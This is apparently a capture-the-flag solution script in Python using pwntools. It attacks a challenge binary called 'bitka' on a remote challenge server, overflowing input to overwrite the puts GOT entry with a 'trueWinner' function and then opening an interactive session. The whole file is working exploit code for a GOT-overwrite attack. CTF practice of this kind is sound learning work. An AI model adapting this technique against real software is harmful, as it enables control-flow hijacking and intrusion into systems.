from pwn import *

elf = ELF('./bitka')

payload = b'A' *  cyclic_find('baab')     # padding
payload += p64(elf.got['puts'])           # target address of second scanf

payload2 = p64(elf.symbols['trueWinner']) # overwrite puts entry with trueWinner

r = remote(b'chal.hackultet.hr', 13018)
r.recvuntil(b': ')
r.sendline(b'name')
r.recvuntil(b'> ')
r.sendline(b'vitez')
r.recvuntil(b': ')
r.sendline(b'21')
r.recvuntil(b': ')
r.sendline(payload)

r.recvuntil(b': ')
r.sendline(b'name 2')
r.recvuntil(b'> ')
r.sendline(b'carobnjak')
r.recvuntil(b': ')
r.sendline(b'21')
r.recvuntil(b': ')
r.sendline(payload2)

r.interactive()
